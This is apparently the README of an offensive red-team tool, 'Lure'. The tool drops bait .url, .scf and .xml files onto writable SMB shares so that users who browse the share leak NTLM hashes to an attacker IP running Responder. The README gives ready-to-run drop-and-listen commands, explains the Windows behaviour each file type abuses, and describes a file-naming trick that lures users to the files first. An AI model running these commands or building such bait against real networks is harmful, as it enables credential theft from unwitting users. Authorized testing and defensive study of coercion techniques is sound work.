<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Lure/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Lure/main/docs/assets/logo-light.svg">
  <img alt="Lure" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Lure/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Python](https://img.shields.io/badge/language-Python-3776AB.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**SMB hash bait for authorized red team engagements.**

Drops poisoned `.url`, `.scf`, and `.xml` files onto writable SMB shares to coerce NTLM authentication from any user that browses the share. Captured hashes feed straight into Responder for offline cracking or relay. Catppuccin Mocha terminal output.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

```bash
# pipx (recommended)
pipx install git+https://github.com/Real-Fruit-Snacks/Lure.git

# Or standard pip
pip install git+https://github.com/Real-Fruit-Snacks/Lure.git
```

```bash
# Drop a .url file on an open share and start Responder
sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -u

# Authenticated put across a domain share, prompting for the password
sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 \
    -a shares -d CORP -U jdoe --ask-pass -u

# Drop all three payload types at once with a custom basename
sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -A --name @docs

# After the engagement: remove the payloads from the share
sudo lure -r 10.10.10.5 -a public -A --cleanup
```

> `lure` requires `smbclient` and `responder` on `$PATH`. On Kali: `sudo apt install smbclient responder`.

---

## Features

### Three Payload Types

Generates three proven hash-coercion payloads, each abusing a different Windows auto-resolve behavior:

| File | Mechanism | Trigger |
|------|-----------|---------|
| `@lure.url` | `IconFile` UNC → forces icon resolution | Explorer opens the share |
| `@lure.scf` | Shell command link with UNC `IconFile` | Explorer opens the share |
| `@lure.xml` | `xml-stylesheet` PI pointing at a remote XSL | Word opens the document |

The `@` prefix sorts the files to the top of the directory listing, maximizing the chance a curious user browses them first.

### Drop and Listen

Lure handles the full workflow in one command: generates the payload, uses `smbclient` to upload it to the target share (anonymous, authenticated, or into a nested subdirectory), then hands off to Responder on your chosen interface to catch the inbound authentication.

### Subdirectory Targeting

When the share root is read-only but a subdirectory is writable, `-o <path>` uploads the payload directly into the nested location without requiring a separate mount.

### Water-Themed Terminal Output

Catppuccin Mocha palette — Teal, Sky, Sapphire, Blue, Lavender — applied via 24-bit ANSI escapes. Status messages use green / yellow / red semantics for success / progress / error.

---

## Command Reference

### Target

| Flag | Description |
|------|-------------|
| `-r`, `--RHOST <ip>` | Target SMB server |
| `-l`, `--LHOST <ip>` | Attacker IP (embedded in payload UNC path) |
| `-a`, `--Share <name>` | Target share name |
| `-o`, `--Other <path>` | Nested subdirectory inside the share |
| `-i`, `--Interface <iface>` | Responder listen interface |

### Authentication

| Flag | Description |
|------|-------------|
| `-d`, `--DOMAIN <name>` | Domain for authenticated upload |
| `-U`, `--Username <user>` | Username for authenticated upload |
| `-P`, `--Password <pass>` | Password (visible in `ps`; prefer the alternatives below) |
| `--ask-pass` | Prompt for the password interactively (no echo) |
| `$LURE_PASSWORD` | Environment variable consulted when `-P` is absent |

### Payload Selection

| Flag | Description |
|------|-------------|
| `-u`, `--url` | Drop the `.url` payload |
| `-s`, `--scf` | Drop the `.scf` payload |
| `-x`, `--xml` | Drop the `.xml` payload |
| `-A`, `--All` | Drop all three in a single `smbclient` session |
| `--name <base>` | Custom payload basename (default: `@lure`) |

### Modes

| Flag | Description |
|------|-------------|
| `--no-responder` | Drop the payload only — skip the Responder handoff |
| `--cleanup` | Delete previously dropped payloads from the share (implies `--no-responder`) |
| `-V`, `--version` | Print version and exit |

### Upload Modes

| Condition | Behavior |
|-----------|----------|
| `-U` and password set | Authenticated upload using `DOMAIN/USER` + `--password` |
| `-o <path>` set | `cd` into nested path before `put`/`del` |
| Neither | Anonymous upload to share root |

### Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Success |
| `2` | Invalid argument combination (e.g. username without password) |
| `4` | Prerequisite missing (`smbclient` or `responder` not on `$PATH`) |
| other | Propagated from `smbclient` |

---

## Platform Support

| Capability | Linux | macOS | Windows |
|------------|-------|-------|---------|
| Payload generation | Full | Full | Full |
| `smbclient` upload | Full | Full (via Homebrew) | WSL only |
| Responder handoff | Full | -- | WSL only |
| Color output | Full | Full | Full (Windows Terminal) |

Lure is built for the standard Kali attacker workstation. `smbclient` and Responder are assumed to be on `$PATH`.

---

## Security

Report vulnerabilities via GitHub Security Advisories. Do not open public issues for security concerns.

Lure is an **authenticated-user coercion tool**, not a vulnerability scanner. It does **not**:

- Exploit memory-corruption bugs
- Bypass authentication or elevate privileges directly
- Generate long-lived implants or beaconing
- Target hosts outside the engagement scope you provide

Hash capture requires Responder (or your listener of choice) on a network path the target can reach. Nothing happens until a user with credentials interacts with the shared directory.

---

## License

[MIT](LICENSE) -- Copyright 2026 Real-Fruit-Snacks
